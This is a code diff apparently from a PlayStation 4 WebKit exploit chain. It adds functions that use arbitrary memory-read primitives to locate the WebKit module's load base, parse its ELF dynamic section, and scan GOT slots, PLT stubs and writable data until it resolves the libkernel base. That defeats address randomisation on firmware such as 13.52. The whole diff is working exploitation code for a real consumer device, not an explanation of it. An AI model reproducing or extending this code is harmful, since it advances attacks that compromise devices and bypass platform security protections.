@@ -251,6 +251,43 @@ function elfImageBase(p, base) {
     return null;
 }
 
+/** expm1-derived base may land in .text — walk back to SCE/ELF header. */
+function resolveModuleLoadBase(p, hint) {
+    if (!hint) return null;
+    if (elfImageBase(p, hint)) return hint;
+    const sceBack = hint.sub32(SCE_ELF_OFF);
+    if (elfImageBase(p, sceBack)) return sceBack;
+    let page = pageAlignDown(hint, 0x1000);
+    for (let i = 0; i < 512; i++) {
+        if (elfImageBase(p, page)) return page;
+        const prev = page.sub32(0x1000);
+        if (!prev || prev.hi < 0x8) break;
+        page = prev;
+    }
+    return hint;
+}
+
+function minLoadVaddr(p, img, ePhoff, ePhnum, ePhentsize) {
+    let min = null;
+    for (let i = 0; i < ePhnum; i++) {
+        const ph = ePhoff + i * ePhentsize;
+        if (read4p(p, img.add32(ph)) !== PT_LOAD) continue;
+        const va = u64Lo(read8p(p, img.add32(ph + 0x10)));
+        if (va == null) continue;
+        if (min === null || va < min) min = va;
+    }
+    return min || 0;
+}
+
+function fmtMagic(w) {
+    if (w == null) return "null";
+    const b = w >>> 0;
+    return "0x" + (b & 0xff).toString(16).padStart(2, "0")
+        + (b >>> 8 & 0xff).toString(16).padStart(2, "0")
+        + (b >>> 16 & 0xff).toString(16).padStart(2, "0")
+        + (b >>> 24 & 0xff).toString(16).padStart(2, "0");
+}
+
 function isModuleMagic(w) {
     return w === ELF_MAGIC || w === SCE_MAGIC;
 }
@@ -260,10 +297,10 @@ function u64Lo(w) {
     return Number(u64FromRead8(w) & 0xffffffffn);
 }
 
-/** Parse PT_DYNAMIC from webkit in memory — vaddrs are RVAs from SCE load base. */
+/** Parse PT_DYNAMIC — vaddrs are linked VAs; memory = loadBase + VA (PS4 PIE). */
 function parseDynamicMeta(p, webkitBase) {
-    const loadBase = webkitBase;
-    const img = elfImageBase(p, webkitBase);
+    const loadBase = resolveModuleLoadBase(p, webkitBase);
+    const img = elfImageBase(p, loadBase);
     if (!img) return null;
     if (read2p(p, img.add32(0x12)) !== 0x3e) return null;
 
@@ -271,6 +308,8 @@ function parseDynamicMeta(p, webkitBase) {
     const ePhnum = read2p(p, img.add32(0x38));
     const ePhentsize = read2p(p, img.add32(0x36));
     if (ePhoff == null || !ePhnum || !ePhentsize) return null;
+
+    const bias = minLoadVaddr(p, img, ePhoff, ePhnum, ePhentsize);
 
     let dynVaddr = null;
     let dynMemsz = 0;
@@ -283,23 +322,75 @@ function parseDynamicMeta(p, webkitBase) {
     }
     if (dynVaddr == null || dynMemsz < 16) return null;
 
-    const meta = { loadBase, img, dynVaddr, dynMemsz };
-    for (let off = 0; off + 16 <= dynMemsz; off += 16) {
-        const tag = u64Lo(read8p(p, loadBase.add32(dynVaddr + off)));
-        const val = u64Lo(read8p(p, loadBase.add32(dynVaddr + off + 8)));
-        if (tag == null || val == null) break;
-        if (tag === 0) break;
-        if (tag === DT_PLTGOT || tag === DT_SCE_PLTGOT) meta.pltgot = val;
-        else if (tag === DT_PLTRELSZ || tag === DT_SCE_PLTRELSZ) meta.pltrelsz = val;
-        else if (tag === DT_RELA || tag === DT_SCE_RELA) meta.rela = val;
-        else if (tag === DT_RELASZ || tag === DT_SCE_RELASZ) meta.relasz = val;
-        else if (tag === DT_RELAENT || tag === DT_SCE_RELAENT) meta.relaent = val;
-        else if (tag === DT_JMPREL || tag === DT_SCE_JMPREL) meta.jmprel = val;
+    const vaTries = [dynVaddr];
+    if (bias && dynVaddr >= bias) vaTries.push(dynVaddr - bias);
+
+    for (let t = 0; t < vaTries.length; t++) {
+        const dynVa = vaTries[t];
+        const meta = { loadBase, img, dynVaddr: dynVa, dynMemsz, bias };
+        let tags = 0;
+        for (let off = 0; off + 16 <= dynMemsz; off += 16) {
+            const tag = u64Lo(read8p(p, loadBase.add32(dynVa + off)));
+            const val = u64Lo(read8p(p, loadBase.add32(dynVa + off + 8)));
+            if (tag == null || val == null) break;
+            if (tag === 0) break;
+            tags++;
+            if (tag === DT_PLTGOT || tag === DT_SCE_PLTGOT) meta.pltgot = val;
+            else if (tag === DT_PLTRELSZ || tag === DT_SCE_PLTRELSZ) meta.pltrelsz = val;
+            else if (tag === DT_RELA || tag === DT_SCE_RELA) meta.rela = val;
+            else if (tag === DT_RELASZ || tag === DT_SCE_RELASZ) meta.relasz = val;
+            else if (tag === DT_RELAENT || tag === DT_SCE_RELAENT) meta.relaent = val;
+            else if (tag === DT_JMPREL || tag === DT_SCE_JMPREL) meta.jmprel = val;
+        }
+        if (tags >= 2 && (meta.pltgot || meta.jmprel || meta.rela)) return meta;
     }
-    return meta;
+    return null;
 }
 
-/** Calculate GOT slot RVAs from DT_JMPREL / DT_RELA (mapped cap only). */
+/** Runtime diagnostic — why dynamic GOT produced 0 usable slots. */
+export function diagnoseWebkitDynamic(p, webkitBase, off) {
+    const cap = iatCap(off);
+    const loadBase = resolveModuleLoadBase(p, webkitBase);
+    const magic = read4p(p, loadBase);
+    const out = {
+        hint: String(webkitBase),
+        loadBase: String(loadBase),
+        magic: fmtMagic(magic),
+        cap: "+0x" + cap.toString(16),
+    };
+    const img = elfImageBase(p, loadBase);
+    if (!img) {
+        out.reason = "no SCE/ELF header @ loadBase (walked back from hint)";
+        return out;
+    }
+    out.header = read4p(p, loadBase) === SCE_MAGIC ? "SCE" : "ELF";
+    const meta = parseDynamicMeta(p, webkitBase);
+    if (!meta) {
+        out.reason = "PT_DYNAMIC unreadable";
+        return out;
+    }
+    out.jmprel = "+0x" + (meta.jmprel || 0).toString(16);
+    out.pltgot = "+0x" + (meta.pltgot || 0).toString(16);
+    out.rela = "+0x" + (meta.rela || 0).toString(16);
+    const all = collectDynamicGotRvas(p, meta, null);
+    const inCap = all.filter(r => r >= 0x1000 && r <= cap);
+    out.total = all.length;
+    out.inCap = inCap.length;
+    if (all.length) {
+        out.minRva = "+0x" + all[0].toString(16);
+        out.maxRva = "+0x" + all[all.length - 1].toString(16);
+    }
+    if (!all.length)
+        out.reason = "dynamic tags OK but 0 GOT RVAs extracted";
+    else if (!inCap.length)
+        out.reason = "all " + all.length + " GOT slots above cap " + out.cap
+            + " (high RELRO unmapped on 13.52)";
+    else
+        out.reason = "ok";
+    return out;
+}
+
+/** Calculate GOT slot RVAs from DT_JMPREL / DT_RELA (cap=null → all slots). */
 function collectDynamicGotRvas(p, meta, cap) {
     const base = meta.loadBase;
     const seen = {};
@@ -307,7 +398,7 @@ function collectDynamicGotRvas(p, meta, cap) {
 
     function add(rva) {
         if (rva == null || rva < 8) return;
-        if (cap && rva > cap) return;
+        if (cap != null && rva > cap) return;
         const k = rva.toString(16);
         if (seen[k]) return;
         seen[k] = 1;
@@ -342,6 +433,15 @@ function collectDynamicGotRvas(p, meta, cap) {
 
     slots.sort((a, b) => a - b);
     return slots;
+}
+
+function splitSlotsByCap(all, cap) {
+    const inCap = [];
+    for (let i = 0; i < all.length; i++) {
+        const r = all[i];
+        if (r >= 0x1000 && r <= cap) inCap.push(r);
+    }
+    return inCap;
 }
 
 function scoreModuleAt(p, base) {
@@ -380,10 +480,15 @@ function findModuleBaseBackward(p, addr, maxPages) {
     return null;
 }
 
+function moduleLoadBase(p, hint) {
+    return resolveModuleLoadBase(p, hint);
+}
+
 /** PLT stub @ webkit+pltRva — ff 25 or ff 15 → GOT slot → target fn ptr. */
 function resolvePltImportAt(p, webkitBase, pltRva) {
     if (pltRva == null) return null;
-    const stub = webkitBase.add32(pltRva);
+    const base = moduleLoadBase(p, webkitBase);
+    const stub = base.add32(pltRva);
     const op = read2p(p, stub);
     if (op !== 0x25ff && op !== 0x15ff) return null;
     const disp = s32(read4p(p, stub.add32(2)));
@@ -430,11 +535,12 @@ function lkFromFnPtr(p, fnPtr, off, iatRva) {
 /** Verify GOT slot — read8 + optional PLT hop + ≤4 follow-up reads. */
 function safeVerifyGotSlot(p, webkitBase, off, rva) {
     if (!rvaAllowed(rva, off)) return null;
-    let fnPtr = read8p(p, webkitBase.add32(rva));
+    const base = moduleLoadBase(p, webkitBase);
+    let fnPtr = read8p(p, base.add32(rva));
     if (!fnPtr) return null;
-    fnPtr = resolveImportPtr(p, webkitBase, off, fnPtr, 0);
+    fnPtr = resolveImportPtr(p, base, off, fnPtr, 0);
     if (!fnPtr) return null;
-    if (plausibleExtPtr(fnPtr, webkitBase, off))
+    if (plausibleExtPtr(fnPtr, base, off))
         return lkFromFnPtr(p, fnPtr, off, rva);
     const walked = findModuleBaseBackward(p, fnPtr, 512);
     if (walked && looksLikeLibkernelModule(p, walked))
@@ -470,10 +576,12 @@ function scanAnchorsAdvance(sub, radius) {
 /** Scan mapped .text for FF 15/FF 25 → GOT slots within cap. */
 function scanPltGotChunk(p, webkitBase, off, state) {
     if (!state) {
+        const base = moduleLoadBase(p, webkitBase);
         const textRanges = elfMappedTextRanges(p, webkitBase, off);
         if (!textRanges.length)
             return { done: true, lk: null, state: null, phase: "no-text" };
         state = {
+            base,
             textRanges,
             rangeIdx: 0,
             cursor: textRanges[0].lo,
@@ -492,8 +600,8 @@ function scanPltGotChunk(p, webkitBase, off, state) {
     let batchBytes = 0;
     while (state.cursor < state.endRva && batchBytes < 2048) {
         const rva = state.cursor;
-        const w0 = read4p(p, webkitBase.add32(rva));
-        const w1 = read4p(p, webkitBase.add32(rva + 4));
+        const w0 = read4p(p, state.base.add32(rva));
+        const w1 = read4p(p, state.base.add32(rva + 4));
         if (w0 != null && w1 != null) {
             const bytes = [
                 w0 & 0xff, (w0 >>> 8) & 0xff, (w0 >>> 16) & 0xff, (w0 >>> 24) & 0xff,
@@ -503,7 +611,7 @@ function scanPltGotChunk(p, webkitBase, off, state) {
                 if (bytes[i] !== 0xff) continue;
                 if (bytes[i + 1] !== 0x15 && bytes[i + 1] !== 0x25) continue;
                 const insnRva = rva + i;
-                const raw = read4p(p, webkitBase.add32(insnRva + 2));
+                const raw = read4p(p, state.base.add32(insnRva + 2));
                 const disp = s32(raw);
                 if (disp == null) continue;
                 const gotRva = insnRva + 6 + disp;
@@ -554,6 +662,98 @@ function scanPltGotChunk(p, webkitBase, off, state) {
         phase: "plt",
         cursor: state.cursor,
         refs: state.refs,
+    };
+}
+
+/** Scan mapped RW/data within cap for external code pointers → libkernel walk-back. */
+function scanMappedExtPtrChunk(p, webkitBase, off, state) {
+    if (!state) {
+        const loadBase = resolveModuleLoadBase(p, webkitBase);
+        const ranges = elfMappedGotRanges(p, loadBase, off);
+        if (!ranges.length)
+            return { done: true, lk: null, state: null, phase: "rwptr-empty" };
+        state = {
+            loadBase,
+            ranges,
+            rangeIdx: 0,
+            cursor: ranges[0].lo,
+            endRva: ranges[0].hi,
+            tried: 0,
+        };
+        return {
+            done: false,
+            state,
+            phase: "rwptr-start",
+            ranges: ranges.length,
+        };
+    }
+
+    let batch = 0;
+    while (state.cursor < state.endRva && batch < 24) {
+        const rva = state.cursor;
+        state.cursor += 8;
+        state.tried++;
+        batch++;
+        const fnPtr = read8p(p, state.loadBase.add32(rva));
+        if (!fnPtr || !plausibleExtPtr(fnPtr, state.loadBase, off)) continue;
+        const hit = lkFromFnPtr(p, fnPtr, off, rva);
+        if (hit) {
+            saveLibkernelSession(hit.lk, hit.iatRva);
+            return {
+                done: true,
+                lk: hit.lk,
+                iatRva: hit.iatRva,
+                source: "rwptr+" + rva.toString(16) + "/" + hit.via,
+                state,
+                phase: "rwptr-hit",
+                tried: state.tried,
+            };
+        }
+        const walked = findModuleBaseBackward(p, fnPtr, 512);
+        if (walked && looksLikeLibkernelModule(p, walked)) {
+            saveLibkernelSession(walked, rva);
+            return {
+                done: true,
+                lk: walked,
+                iatRva: rva,
+                source: "rwptr-walk+" + rva.toString(16),
+                state,
+                phase: "rwptr-hit",
+                tried: state.tried,
+            };
+        }
+    }
+
+    if (state.cursor >= state.endRva) {
+        const next = state.rangeIdx + 1;
+        if (next < state.ranges.length) {
+            state.rangeIdx = next;
+            state.cursor = state.ranges[next].lo;
+            state.endRva = state.ranges[next].hi;
+            return {
+                done: false,
+                state,
+                phase: "rwptr-region",
+                region: state.ranges[next].tag,
+                cursor: state.cursor,
+                tried: state.tried,
+            };
+        }
+        return {
+            done: true,
+            lk: null,
+            state,
+            phase: "rwptr-miss",
+            tried: state.tried,
+        };
+    }
+
+    return {
+        done: false,
+        state,
+        phase: "rwptr",
+        cursor: state.cursor,
+        tried: state.tried,
     };
 }
 
@@ -704,7 +904,8 @@ function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors) {
 /** PT_LOAD readable non-exec within cap — RELRO .got + writable data. */
 export function elfMappedGotRanges(p, webkitBase, off) {
     const cap = iatCap(off);
-    const img = elfImageBase(p, webkitBase);
+    const loadBase = resolveModuleLoadBase(p, webkitBase);
+    const img = elfImageBase(p, loadBase);
     if (!img) return [];
     if (read2p(p, img.add32(0x12)) !== 0x3e) return [];
 
@@ -746,7 +947,8 @@ export function elfMappedRwRanges(p, webkitBase, off) {
 /** PT_LOAD executable segments within mapped cap. */
 export function elfMappedTextRanges(p, webkitBase, off) {
     const cap = iatCap(off);
-    const img = elfImageBase(p, webkitBase);
+    const loadBase = resolveModuleLoadBase(p, webkitBase);
+    const img = elfImageBase(p, loadBase);
     if (!img) return [];
     if (read2p(p, img.add32(0x12)) !== 0x3e) return [];
 
@@ -885,15 +1087,22 @@ export function resolveLibkernelDynamic(p, webkitBase, off, opts) {
     opts = opts || {};
     const log = opts.log || (() => {});
     const cap = iatCap(off);
-    const meta = parseDynamicMeta(p, webkitBase);
-    if (!meta) {
-        log("LK-DYN", "PT_DYNAMIC parse failed");
-        return { ok: false, error: "no PT_DYNAMIC" };
+    const diag = diagnoseWebkitDynamic(p, webkitBase, off);
+    if (diag.reason !== "ok") {
+        log("LK-DYN", diag.reason
+            + " magic=" + diag.magic
+            + " loadBase=" + diag.loadBase
+            + (diag.total != null ? " total=" + diag.total + " inCap=" + diag.inCap : "")
+            + (diag.jmprel ? " jmprel=" + diag.jmprel : "")
+            + (diag.pltgot ? " pltgot=" + diag.pltgot : "")
+            + (diag.minRva ? " rva=" + diag.minRva + ".." + diag.maxRva : "")
+            + " cap=" + diag.cap);
+        return { ok: false, error: diag.reason, diag };
     }
-    const slots = collectDynamicGotRvas(p, meta, cap);
-    log("LK-DYN", "computed " + slots.length + " GOT slots"
-        + " jmprel=+0x" + (meta.jmprel || 0).toString(16)
-        + " pltgot=+0x" + (meta.pltgot || 0).toString(16));
+    const meta = parseDynamicMeta(p, webkitBase);
+    const slots = splitSlotsByCap(collectDynamicGotRvas(p, meta, null), cap);
+    log("LK-DYN", "inCap " + slots.length + "/" + diag.total
+        + " jmprel=" + diag.jmprel + " pltgot=" + diag.pltgot + " cap=" + diag.cap);
     for (let i = 0; i < slots.length; i++) {
         const hit = safeVerifyGotSlot(p, webkitBase, off, slots[i]);
         if (hit) {
@@ -908,31 +1117,47 @@ export function resolveLibkernelDynamic(p, webkitBase, off, opts) {
             };
         }
     }
-    return { ok: false, error: "dynamic GOT had no libkernel import", slots: slots.length };
+    return { ok: false, error: "dynamic GOT inCap miss", slots: slots.length, diag };
+}
+
+function dynDetail(p, webkitBase, off) {
+    return diagnoseWebkitDynamic(p, webkitBase, off);
 }
 
 function scanDynamicGotChunk(p, webkitBase, off, state) {
     if (!state) {
         const cap = iatCap(off);
+        const detail = dynDetail(p, webkitBase, off);
         const meta = parseDynamicMeta(p, webkitBase);
         if (!meta) {
-            return { done: true, lk: null, state: null, phase: "dyn-bad" };
+            return {
+                done: true,
+                lk: null,
+                state: null,
+                phase: "dyn-bad",
+                detail,
+            };
         }
-        const slots = collectDynamicGotRvas(p, meta, cap);
+        const all = collectDynamicGotRvas(p, meta, null);
+        const slots = splitSlotsByCap(all, cap);
         if (!slots.length) {
             return {
                 done: true,
                 lk: null,
                 state: null,
                 phase: "dyn-empty",
+                detail,
                 jmprel: meta.jmprel,
                 pltgot: meta.pltgot,
+                total: all.length,
+                inCap: 0,
             };
         }
         state = {
             slots,
             idx: 0,
             tried: 0,
+            total: all.length,
             meta: {
                 jmprel: meta.jmprel,
                 pltgot: meta.pltgot,
@@ -944,8 +1169,10 @@ function scanDynamicGotChunk(p, webkitBase, off, state) {
             state,
             phase: "dyn-start",
             slots: slots.length,
+            total: all.length,
             jmprel: meta.jmprel,
             pltgot: meta.pltgot,
+            detail,
         };
     }
 
@@ -1188,10 +1415,12 @@ function scanPsfreePltChunk(p, webkitBase, off, state) {
     const TEXT_CAP = 0x200000;
 
     if (!state) {
+        const base = moduleLoadBase(p, webkitBase);
         const textRanges = elfMappedTextRanges(p, webkitBase, off);
         if (!textRanges.length)
             return { done: true, lk: null, state: null, phase: "psfree-skip" };
         state = {
+            base,
             textRanges,
             rangeIdx: 0,
             cursor: textRanges[0].lo,
@@ -1205,8 +1434,8 @@ function scanPsfreePltChunk(p, webkitBase, off, state) {
     let batch = 0;
     while (state.cursor < state.endRva && batch < 512) {
         const rva = state.cursor;
-        if (read2p(p, webkitBase.add32(rva)) === 0x25ff
-            || read2p(p, webkitBase.add32(rva)) === 0x15ff) {
+        if (read2p(p, state.base.add32(rva)) === 0x25ff
+            || read2p(p, state.base.add32(rva)) === 0x15ff) {
             const key = rva.toString(16);
             if (!state.seen[key]) {
                 state.seen[key] = 1;
@@ -1291,19 +1520,44 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
             return Object.assign({ state }, c);
         }
         if (c.done) {
+            state.stage = "rwptr";
+            state.sub = null;
+            state.dynTried = c.tried || 0;
+            state.dynSlots = c.slots || c.inCap || 0;
+            state.dynTotal = c.total || 0;
+            state.dynDetail = c.detail;
+            state.dynPrev = c.phase;
+            return {
+                done: false,
+                state,
+                phase: "dyn-done",
+                prev: c.phase,
+                dynSlots: c.slots || c.inCap || 0,
+                dynTotal: c.total || 0,
+                dynTried: c.tried || 0,
+                detail: c.detail,
+                jmprel: c.jmprel,
+                pltgot: c.pltgot,
+            };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    if (state.stage === "rwptr") {
+        const c = scanMappedExtPtrChunk(p, webkitBase, off, state.sub);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ state }, c);
+        }
+        if (c.done) {
             state.stage = "elf";
             state.sub = null;
-            state.dynTried = c.tried;
-            state.dynSlots = c.slots;
             return {
                 done: false,
                 state,
                 phase: "elf-next",
                 prev: c.phase,
-                dynSlots: c.slots,
-                dynTried: c.tried,
-                jmprel: c.jmprel,
-                pltgot: c.pltgot,
+                rwptrTried: c.tried,
             };
         }
         return Object.assign({ state }, c);
